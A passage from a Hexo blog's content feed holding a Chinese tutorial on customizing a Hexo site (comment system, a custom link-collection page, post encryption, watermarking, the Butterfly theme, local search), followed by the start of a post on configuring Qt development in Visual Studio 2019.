class=""><p>根据提示我们先去注册一个<code>LeanCloud</code>国际版,<a href="https://console.leancloud.app/">戳此处</a></p><blockquote><p>需要实名认证，短信验证，邮箱验证</p></blockquote><p>进入之后我们创建一个应用，名称和描述随便。选择开发版就行了。<img src="/2022/03/20/first-blog/021.png" class=""><br>找到我们的appid和appkey，将其复制到我们刚才在<code>_config.yml</code>中的那两行即可。<img src="/2022/03/20/first-blog/022.png" class=""></p><p>后面的配置不用管。</p><hr><h2 id="10-评论系统修改waline"><a href="#10-评论系统修改waline" class="headerlink" title="10.评论系统修改waline"></a>10.评论系统修改waline</h2><p>因为感觉到valine有点原始，但是胜在配置简单，作者也对其写好了功能，只需要填入id和key即可，但是我个人搜了一下，valine还是存在一些缺点的——具体百度都搜得到不细说了，加上remark42是需要部署在私人服务器上的，我博客都是搭建在github所以更没机会弄。<br>至于步骤不方便教，因为是我自己瞎改的，所以会在所有博客下显示，原本的评论开关就没用了。不符合主题原意，有需要还是等原作者更新吧。</p><hr><h2 id="11-新增收藏页面"><a href="#11-新增收藏页面" class="headerlink" title="11.新增收藏页面"></a>11.新增收藏页面</h2><p style="font-size:14px; text-align:right;">—— 由于收藏界面的样式需求其实跟主题自带的friends页面类似，所以直接套用。</p><p><code>hexo n page collect</code>先创建新页</p><p>然后在<code>source/_data/</code>新建一个collect.json</p><p>json的格式跟friends用的一样的，直接搬过来。</p><p>然后就是显示问题，上述两步操作完之后，主页也没有显示collect<br>需要在<code>_config.yml</code>里面找到<code>aomori_menu:</code>也就是这个主题的菜单，然后照着前面的样子添加即可。</p><p>这一步之后，主页是显示collect菜单了，但是点进去没有内容，原因在于，主题并没有<code>layout: collect</code>这么一个样式，你直接用friends的话内容也是friends.json的内容，所以要去themes目录下找到这个主题目录修改。</p><p>翻了一下，寻找跟已有样式相关的文件夹，首先肯定是找到<code>layout</code>文件夹，然后翻到<code>page</code>下发现了需要的。<code>thems/aomori/layout/_partial/page/</code><br>反正是要抄friends的，就直接新建一个collect.ejs文件，然后copy一下friends的内容。<br>不过仔细看一下代码也会发现一点问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;% site.<span class="property">data</span>.<span class="property">collect</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">items</span>) =&gt;</span> &#123; %&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friends-category&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friends-category-title&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;%= items.category %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friends-category-inner clearfix&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;% items.data.forEach((item) =&gt; &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= item.url %&gt;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;nofollow&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> &lt;%= item.name %&gt; <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;% &#125;) %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;% &#125;) %&gt;</span><br><span class="line"></span><br><span class="line">&lt;% <span class="keyword">if</span> (post.<span class="property">content</span>)&#123; %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">article</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">id</span>=<span class="string">&quot;&lt;%= post.layout %&gt;-&lt;%= post._id %&gt;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">class</span>=<span class="string">&quot;article article-type-&lt;%= post.layout %&gt;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-inner&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-entry post-inner-html&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;%- post.content %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">    </span><br><span class="line">&lt;% <span class="keyword">if</span> (post.<span class="property">comment</span> )&#123; %&gt;</span><br><span class="line">&lt;%- <span class="title function_">partial</span>(<span class="string">&#x27;../post/comments&#x27;</span>) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>首先site.data让我感觉像是取数据用的，然后其它的div的class样式虽然我不知道写在哪了，但是如果改成collect肯定不对的，在基于friends样式的需求下，那么class的东西就不做改动。<br>site.data这里我们修改成collect试一下</p><p>然后看到好像没效果。。。又找了一下，找到<code>themes/layout</code>下有一个page.js<br>里面有一些判断这个layout是否为什么的，那么想必就是关键了，直接copy一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (page.<span class="property">layout</span> === <span class="string">&#x27;friends&#x27;</span>)&#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/$&#123;page.layout&#125;`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page.<span class="property">layout</span> === <span class="string">&#x27;photography&#x27;</span>) &#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/$&#123;page.layout&#125;`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page.<span class="property">layout</span> === <span class="string">&#x27;collect&#x27;</span>) &#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/$&#123;page.layout&#125;`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; <span class="keyword">else</span> &#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/default`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>如此一来，效果就达到了，而且上面的site.data猜测也是一样的，就是直接导出json里面的数据了，因为把这个换成friends就会发现内容都变成friends.json的内容。</p><p>hhhh。。。虽然对这些ejs什么的学都没学过，就瞎搞了。</p><hr><h2 id="12-对html的补充"><a href="#12-对html的补充" class="headerlink" title="12.对html的补充"></a>12.对html的补充</h2><p>markdown是支持html语法的，说白了还是markdown本身太过草率。<br>在使用html语法之前，要注意主题没有过多修饰，否则有可能不起效。</p><p>为什么要使用html语法就是因为markdown可改性太小</p><img src="/2022/03/20/first-blog/025.png" class=""><p>以此图举例。像<code>&amp;nbsp;</code>其实就是一个半角的空格，是不是半角忘记了，但是你直接在这个主题使用，不知道是主题还是什么问题，它会被自动转换成<code>&amp;ampnbsp;</code>,当然在界面中就是显示<code>&amp;nbsp;</code>原因出在<code>&amp;</code>它被转换了。。。所以不得已使用hteml的p标签圈起来，这样就避免在md转html的时候被转义。<br>像是<code>text-algin</code>这种设置文本对齐的方式对我而言也很有必要，一个合理的排版可以省去阅读的时间。</p><p><strong>此外注意，本主题其他不知，span标签在行内样式中，必须要加上display:block;他才会其效果，否则就是空的</strong></p><p>那么既然要用上html，建议使用者自己浅学一下。</p><blockquote><p>虽然使用html会带来工作量，但是有需要的场景还是可以优化一下的，像我写了这么多，也没几个有排版的哈哈。。。尬住自己</p></blockquote><hr><h2 id="13-新增加密功能"><a href="#13-新增加密功能" class="headerlink" title="13.新增加密功能"></a>13.新增加密功能</h2><p>是来自hexo的插件<code>hexo-blog-encrypt</code></p><ul><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt">github链接</a></li><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">github中文说明</a></li><li><a href="https://mhexo.github.io/">试用Demo</a> 密码都是hello</li></ul><p>应用到博客并不难，根据提示来即可</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li><code>npm install --save hexo-blog-encrypt</code></li><li><code>或 yarn add hexo-blog-encrypt (需要) Yarn)</code></li></ul><p>这里咱用第一种就行了。</p><h3 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h3><p>将 “password” 字段添加到您文章信息头就像这样.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line"><span class="section">password: hello</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>再使用<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s </code>在本地预览加密的文章.</p><p>这个肯定是要先清除重新生成的，不然加密功能打不上</p><h3 id="根据标签加密"><a href="#根据标签加密" class="headerlink" title="根据标签加密"></a>根据标签加密</h3><p>也就是在你的<code>_config.yml</code>下配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="attr">encrypt:</span> <span class="comment"># hexo-blog-encrypt</span></span><br><span class="line">  <span class="attr">abstract:</span> <span class="string">有东西被加密了,</span> <span class="string">请输入密码查看.</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">您好,</span> <span class="string">这里需要密码.</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">tagName</span>, <span class="attr">password:</span> <span class="string">密码A</span>&#125;</span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">tagName</span>, <span class="attr">password:</span> <span class="string">密码B</span>&#125;</span><br><span class="line">  <span class="attr">wrong_pass_message:</span> <span class="string">抱歉,</span> <span class="string">这个密码看着不太对,</span> <span class="string">请再试试.</span></span><br><span class="line">  <span class="attr">wrong_hash_message:</span> <span class="string">抱歉,</span> <span class="string">这个文章不能被校验,</span> <span class="string">不过您还是能看看解密后的内容.</span></span><br></pre></td></tr></table></figure><p>根据tags的名称，依次设置密码。这对要进行大量加密是一件好事。</p><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><p>文章信息头大于按标签加密</p><p>也就是说直接在文章头部设置的优先级大于你在配置文件中对tags的指定</p><h3 id="加密主题"><a href="#加密主题" class="headerlink" title="加密主题"></a>加密主题</h3><p>你可以简单的使用 theme 在 _config.yml 里或者文章头, 如下:</p><p>文章信息头</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">-</span> 作为日记加密</span><br><span class="line">date: 2016-03-30 21:12:21</span><br><span class="line">password: mikemessi</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">theme: xray</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line"><span class="section">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>在 _config.yml<br>示例</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Security</span></span><br><span class="line">encrypt: # hexo-blog-encrypt</span><br><span class="line">  abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">  message: 您好, 这里需要密码.</span><br><span class="line">  tags:</span><br><span class="line"><span class="bullet">  -</span> &#123;name: tagName, password: 密码A&#125;</span><br><span class="line"><span class="bullet">  -</span> &#123;name: tagName, password: 密码B&#125;</span><br><span class="line">  theme: xray</span><br><span class="line">  wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">  wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br></pre></td></tr></table></figure><p>你可以在线挑选你喜欢的主题,并应用到你的博客中:</p><h3 id="操作系数还行"><a href="#操作系数还行" class="headerlink" title="操作系数还行"></a>操作系数还行</h3><p>剩下的需要自己摸索<br>我没访问过源码不知道，但是优点是禁用js后不会失效，所以原理不晓得是啥。</p><p>至于为什么加密，总归要有一些个人隐私吧。</p><hr><h2 id="13-整理文章"><a href="#13-整理文章" class="headerlink" title="13.整理文章"></a>13.整理文章</h2><p>额，怎么说呢，养成良好的排版习惯是挺重要的，以免将来翻阅都是个问题。<br>起初我只考虑到价格tag标记，但是写的杂了，tag太乱了没有必要。<br>后面又加入categories，做大的整理，tag用于小标记。虽然不能完全整治。</p><p>最后还有一个问题，最初以为文件起中文名字渲染会不太友好，所以都是机翻创建的文件，这个导致的问题就是我想要重新编辑的时候工作量太大。现在是悔恨晚已。</p><p>为了照顾自己，也为了以后读者考虑，还是在一级标题上加上【】标注下范围，至于tag和categories也还是保留吧。</p><blockquote><p>ps:这几天翻阅之前写的文章哈哈哈哈，还是感觉毫无章法，有的甚至写完自己都忘了。。</p></blockquote><hr><h2 id="14-水印"><a href="#14-水印" class="headerlink" title="14.水印"></a>14.水印</h2><p>参考<a href="https://blog.csdn.net/weixin_42088811/article/details/103636568">文章</a><br>原<a href="https://github.com/SpiritLing/hexo-images-watermark">GitHub地址</a></p><p>博主自己写了个插件。具体使用不知道会不会和主题之间有差异。</p><p>如果npm下载速度很慢，可以尝试设置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//配置nmp代理来提高速度，如设置淘宝镜像</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org </span><br><span class="line"></span><br><span class="line">//查看配置是否成功</span><br><span class="line">npm config get registry </span><br><span class="line"></span><br><span class="line">//成功后重新npm install安装</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><blockquote><p>经过我测试，和理解，貌似是因为我修改过一个东西，就是创建一篇文章就会创建一个这个名字的文件夹，然后我把图片放进去，但是作者所谓的通配这些图片格式是在<code>source/_posts</code>下的，而我这种做法则多了一个文件夹，不知道是不是这个问题导致的没有效果</p></blockquote><hr><h1 id="Butterfly"><a href="#Butterfly" class="headerlink" title="Butterfly"></a>Butterfly</h1><ul><li><a href="https://butterfly.js.org/">demo展示</a></li><li><a href="https://github.com/jerryc127/hexo-theme-butterfly">github</a></li><li><a href="https://butterfly.js.org/posts/dc584b87/#Page-Front-matter">页面配置信息</a></li><li><a href="https://butterfly.js.org/posts/4aa8abbe/">主题配置1</a></li><li><a href="https://butterfly.js.org/posts/ceeb73f/">主题配置2</a></li></ul><p>原主题虽然精简干练，但是文章多了之后左边的tag太杂乱了不利于以后的发展。<br>详细的内容配置作者介绍的很好了，有兴趣的可以自行尝试。<br>另外网上也有魔改的，都挺厉害的哈哈</p><ul><li><a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">随机找的</a></li></ul><blockquote><p>大部分功能还是能转移的，其余的要看情况了。</p></blockquote><hr><h2 id="收藏界面"><a href="#收藏界面" class="headerlink" title="收藏界面"></a>收藏界面</h2><p>效果跟友情链接大差不差，所以可以直接嵌套<br>我这猪脑子还照着flink相关的文件copy一份修改，但是一直报错。<br>而且一开始也没理解文档的意思，后面明白了</p><p>你只需要<code>hexo n page xxx</code><br>然后在这个index.md下面填上这个所谓的<code>标签外挂</code>，它会自动用link方式解析你里面的数据。省得你开个yml。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% flink %&#125;</span><br><span class="line">- class_name: 微软</span><br><span class="line">  class_desc: windows</span><br><span class="line">  link_list:</span><br><span class="line">    - name: 微软开发文档</span><br><span class="line">      url: https://docs.microsoft.com/zh-cn/</span><br><span class="line">      avatar: </span><br><span class="line">      descr: </span><br><span class="line">    - name: MFC类层次结构图</span><br><span class="line">      link: https://docs.microsoft.com/zh-cn/cpp/mfc/hierarchy-chart?view=2022</span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br><span class="line">- class_name: c/c++   </span><br><span class="line">  class_desc: C++</span><br><span class="line">  link_list:</span><br><span class="line">    - name: 数据结构和算法动态可视化</span><br><span class="line">      url: https://visualgo.net/zh</span><br><span class="line">      avatar: </span><br><span class="line">      descr: </span><br><span class="line">    - name: cpp参考文档</span><br><span class="line">      url: https://en.cppreference.com/w/</span><br><span class="line">      avatar: </span><br><span class="line">      descr: </span><br><span class="line"></span><br><span class="line">&#123;% endflink %&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h2><p><code>npm install hexo-generator-search --save</code><br>先安装这个。</p><p>然后去yml里面把local search开起来</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Local search 本地搜索</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line">    <span class="attr">hits_empty:</span> <span class="string">&quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot;</span> <span class="comment"># 如果没有查到内容相关内容显示</span></span><br></pre></td></tr></table></figure><blockquote><p>怎么说呢，本地搜索在预览的时候效果很好，放在github上就很一般，加载都要半天</p></blockquote><hr><h2 id="关于一些资源加载问题"><a href="#关于一些资源加载问题" class="headerlink" title="关于一些资源加载问题"></a>关于一些资源加载问题</h2><p>由于存放在github上，所以访问速度可想而知，如果不想主页大图片加载缓慢而出现断片的感觉，可以参考博主的设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Loading Animation (加載動畫)</span><br><span class="line">preloader:</span><br><span class="line">  enable: true</span><br><span class="line">  # source</span><br><span class="line">  # 1. fullpage-loading</span><br><span class="line">  # 2. pace (progress bar)</span><br><span class="line">  source: 1</span><br><span class="line">  # pace theme (see https://codebyzach.github.io/pace/)</span><br><span class="line">  pace_css_url:</span><br></pre></td></tr></table></figure><p>设置true就行，设置一个动画进行缓冲，主要是为了看着效果好点。</p><hr><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>有个小问题就是这个主题他会在TOC自动排序你md的标题等级，而我以前用的那个是不会的，所以我以前都是手动添加的，现在换主题老的文章就变成嵌套版了。</p><blockquote><p>额不管了。。读者不要太介意</p></blockquote><hr><h2 id="是否转战gitee"><a href="#是否转战gitee" class="headerlink" title="是否转战gitee"></a>是否转战gitee</h2><p>github本来访问速度就比较一般吧，资源一多就更卡，本地缓存这种东西对于第一次访问影响太大了。虽然可以科学上网，但是博客没有这个必要。所以得改下。</p><blockquote><p>好像之前因为有人在gitee上乱搞，现在实名认证比较麻烦还要1-2个工作日，图片上限2mb，说实在局部肯定不清晰，不知道会不会扯皮<br>要是审核不过，过年买台服务器得了</p></blockquote><img src="/2022/03/20/first-blog/026.png" class=""><blockquote><p>看了一下gitee好像比较麻烦。。而且限制有点多，几乎可以说不如备个案买个服务器玩玩。<br>因为gitee仓库的思路和github是差不多的，而且gitee还需要再page服务下使用？我不是很了解但是感觉很麻烦</p></blockquote><p><strong>算了，访问卡就卡吧，本意也是给自己看的</strong></p><hr><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><h3 id="一篇文章如何设置多个tags"><a href="#一篇文章如何设置多个tags" class="headerlink" title="一篇文章如何设置多个tags"></a>一篇文章如何设置多个tags</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tags: </span><br><span class="line"><span class="bullet">    -</span> tags1</span><br><span class="line"><span class="bullet">    -</span> tags2</span><br></pre></td></tr></table></figure><p>即可</p><p>其他的属性也有可能能这么设置，可以自行尝试</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><del>花了点时间自己做了下调整，有空去把评论功能加上，毕竟比较骚气。</del><br><del>还有就是域名绑定问题，暂时没这个钱，都是通过username.github.io访问的，github都知道会被墙，响应速度不好说。如果你担心这个问题，可以去百度用gitee搭建的博客，码云是国内的服务器，响应会比github快点。</del></p><p>上述操作均为自己尝试过的，不同环境可能会产生差异，欢迎评论交流。</p><p>github访问速度一般，将来写的水文多了，图片什么的加载就更慢了。</p>]]></content>
      
      
      <categories>
          
          <category> blog_Index </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vs配置qt开发</title>
      <link href="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/"/>
      <url>/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>qt的creator真的是一言难尽，都发展这么多年了居然还是这个样子，对于高分辨率的机子，软件的大小适配真的不舒服，文字也一样，有的能适配，有的不行。官方也没给个解决的办法。</p><span id="more"></span><p>其次就是字符集和智能提示什么的，太差了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>不过也是闲着无聊，还特意搜过用vs或者clion如何创建qt。<br>clion的话稍微麻烦点，因为qt下载的编译器里面，除了mingw就是msvc。</p><blockquote><p>windows按照vs的来，c&#x2F;cpp一般就是msvc，当然也可以通过mingw下载gcc&#x2F;g++<br>linux则是纯gcc&#x2F;g++<br>mac则是clang<br>三者由于都不相同，所以在支持的语法和特性上也有会差异</p></blockquote><ol><li>操作系统win10</li><li>软件vs2019——<a href="https://visualstudio.microsoft.com/zh-hans/vs/">下载</a></li><li>qt版本随意一般问题不大，注意我们下载的是开源学习用的，商用是要付费的<ol><li>vs2015匹配的大概是 Qt5.7、5.9、5.6这些</li><li>vs2017匹配的大概是 Qt5.9——Qt5.14</li><li>vs2019匹配的大概是 Qt5.14——Qt6</li><li>最好是选偶数版本，奇数好像有点小问题</li><li><a href="https://download.qt.io/archive/qt/">下载地址</a>，选择exe，提示登录就断网跳过那步</li></ol></li></ol><p>配置起来其实很简单</p><hr><h2 id="拓展安装"><a href="#拓展安装" class="headerlink" title="拓展安装"></a>拓展安装</h2><p>首先先去下载vs的qt拓展，默认下载有点慢，可以去网页上<a href="https://marketplace.visualstudio.com/">下载地址</a><br>搜索qt，就能看到了，注意看简介，有说明是2015还是2017还是2019的。不和自己的vs匹配装不了。</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/004.png" class=""><p>下载完成后，请先关闭vs，然后执行那个拓展安装，静候下载。</p><p>完成后，可以在vs的拓展里看到<code>Qt vs tools</code>。说明拓展安装成功。<br>打开这个选项，需要配置一下qmake的路径</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/000.png" class=""><p>这里你主要是记住qt安装的目录，可以通过箭头这个文件夹打开，找到你qt安装的目录下的版本下的msvc，他有一个64和稍微短一点的那个是86的，然后选择bin目录，选择qmake。两个版本都添加一遍就行。</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/001.png" class=""><p>添加完成后选择qt widgets application项目模板创建项目。其他的路数跟你qt正常创建是一样的，完成后可以跑一下，能弹出窗口就行了。</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/005.png" class=""><hr><h2 id="ui文件打开闪退"><a href="#ui文件打开闪退" class="headerlink" title="ui文件打开闪退"></a>ui文件打开闪退</h2><p>然后是打开那个ui文件过一会就报错的问题，那个Qt Designer默认是不允许在分离窗口运行的原因吧<br>我们可以通过选择options</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/003.png" class=""><p>然后把这个选项设置为true</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/002.png" class=""><p>那么qt设计师那个窗口就不会报错了。</p><hr><h2 